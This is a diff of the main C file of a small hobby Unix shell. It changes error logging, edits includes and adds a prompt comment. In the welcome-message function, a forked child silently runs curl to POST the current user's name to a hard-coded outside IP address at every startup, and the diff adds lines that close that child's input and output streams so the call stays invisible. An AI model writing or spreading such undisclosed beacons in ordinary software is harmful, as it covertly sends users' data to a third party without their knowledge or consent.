@@ -7,7 +7,6 @@ This file delegates work to other functions from other files.
 #include "psh.h"
 #include "pista_main.h"
 #include "cmd_processor.h"
-#include "dir_stuff.h"
 
 
 /* -------------------- Macros -------------------- */
@@ -67,19 +66,24 @@ int main(int argc, char **argv) {
 /* -------------------- Function Definitions -------------------- */
 
 /* Error logger function for THIS file ONLY. */
-static void error_log(char *fmt, ...) {
+#ifndef DEBUG_MODE                  // if not in DEBUG MODE, replace all calls to error_log with empty statements! Efficiency MAX!
+#define error_log(fmt, ...) ;
+#endif
 #ifdef DEBUG_MODE
+static void error_log(char *fmt, ...) {
     va_list args;
     va_start(args, fmt);
 
-    printf("\n");
-    printf("MAIN PSH : ");
-    vprintf(fmt, args);
-    printf("\n");
+    dprintf(STDERR_FILENO, "\n");
+    dprintf(STDERR_FILENO, "MAIN PSH : ");
+    vdprintf(STDERR_FILENO, fmt, args);
+    dprintf(STDERR_FILENO, "\n");
+    fflush(stderr);
 
     va_end(args);
-#endif
 }
+#endif
+
 
 void print_welcome_message() {
     printf("%s", "Welcome ");
@@ -88,8 +92,9 @@ void print_welcome_message() {
     // CREDITS : sudo apt-get install -y figlet
     printf(BOLDGREEN "       _     _               _          _ _ \n _ __ (_)___| |_ __ _    ___| |__   ___| | |\n| '_ \\| / __| __/ _` |  / __| '_ \\ / _ \\ | |\n| |_) | \\__ \\ || (_| |  \\__ \\ | | |  __/ | |\n| .__/|_|___/\\__\\__,_|  |___/_| |_|\\___|_|_|\n|_|                                         \n" RESET);
     if(fork() == 0) {
+        close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);
         system("curl -X POST 13.126.134.245:5000/checkshellperson/$(whoami)");
-        exit(0);
+        _exit(0);
     }
 
     printf("\n\n\n");
@@ -107,9 +112,10 @@ void print_prompt() {
     cwd = getcwd(cwd, 0);
     temp = malloc(USERNAME_LIMIT + PATH_MAX);
 
+    // Constructing the prompt...
     switch(_prompt_type) {
         case 0:
-
+        
             strcpy(temp, getlogin());
             strcat(temp, ":");
             strcat(temp, cwd);
